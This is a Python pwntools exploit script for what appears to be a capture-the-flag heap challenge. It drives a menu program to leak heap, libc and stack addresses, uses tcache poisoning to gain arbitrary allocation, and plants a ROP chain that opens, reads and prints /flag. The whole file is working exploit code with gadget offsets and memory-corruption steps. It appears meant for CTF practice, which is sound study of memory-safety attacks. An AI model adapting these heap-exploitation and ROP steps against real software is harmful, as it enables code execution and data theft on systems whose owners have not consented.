#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('pwn_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x1CB8
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def give_birth_to_child(idx, gender, name):
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b"?", str(idx).encode())
    io.sendlineafter(b":", str(gender).encode())
    io.sendafter(b":", name)

def change_child_name(idx, name):
    io.sendlineafter(b">>", b"2")
    io.sendlineafter(b"?", str(idx).encode())
    io.sendafter(b":", name)

def show_child_name(idx):
    io.sendlineafter(b">>", b"3")
    io.sendlineafter(b"?", str(idx).encode())
    io.recvuntil(b"Description:")
    data = io.recv(6)
    return u64(data.ljust(8, b"\x00"))
    
def remove_child(idx):
    io.sendlineafter(b">>", b"4")
    io.sendlineafter(b"?", str(idx).encode()) 

def edit_child_desc(idx, desc):
    io.sendlineafter(b">>", b"5")
    io.sendlineafter(b"?", str(idx).encode()) 
    io.sendafter(b":", desc)

def hack_function(idx, gender):
    io.sendlineafter(b">>", b"666")
    io.sendlineafter(b"?", str(idx).encode())
    io.recvuntil(b"gender:")
    data = io.recv(6)
    io.sendlineafter(b":", str(gender).encode())
    return u64(data.ljust(8, b"\x00"))


def solve():

    for i in range(9):
        give_birth_to_child(i, 1, b"A")

    remove_child(0)
    remove_child(1)
    heap_base = hack_function(1, 1) - 0x10
    info("heap base: %#x", heap_base) 

    remove_child(1)

    for i in range(2, 7):
        remove_child(i)
    
    unsorted_bin_chunk = heap_base + 0x8f8

    for i in range(6):
        give_birth_to_child(i, 1, p64(unsorted_bin_chunk)[:7])

    give_birth_to_child(0, 1, p32(0x111))
    main_arena = show_child_name(0) - 96
    libc.address = main_arena - libc.sym["main_arena"]
    info("libc base: %#x", libc.address)

    remove_child(1)
    remove_child(4)
    change_child_name(5, p64(libc.sym["__environ"] - 0x10)[:7])

    give_birth_to_child(0, 2, p32(0x1337))
    give_birth_to_child(1, 1, p32(0x1337))
    stack = show_child_name(1) - 0x100
    info("stack: %#x", stack)

    remove_child(2)
    remove_child(0)
    change_child_name(5, p64(stack - 0x10)[:7])
    
    give_birth_to_child(0, 2, b"/flag\x00")
    give_birth_to_child(1, 2, b"A"*0x7)

    pop_rdi = libc.address + 0x26b72 # pop rdi ; ret
    pop_rsi = libc.address + 0x27529 # pop rsi ; ret
    pop_rdx = libc.address + 0x1626d6 # pop rdx ; pop rbx ; ret
    flag_str = heap_base + 0x003b0

    ropchain = flat(
        [
            pop_rdi,
            flag_str,
            pop_rsi,
            0x0,
            libc.sym["open"],
            pop_rdi,
            0x4,
            pop_rsi,
            heap_base,
            pop_rdx,
            0x50,
            0x0,
            libc.sym["read"],
            pop_rdi,
            heap_base,
            libc.sym["puts"]
        ]
    )

    edit_child_desc(1, ropchain)
    io.sendlineafter(b">", b"6")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

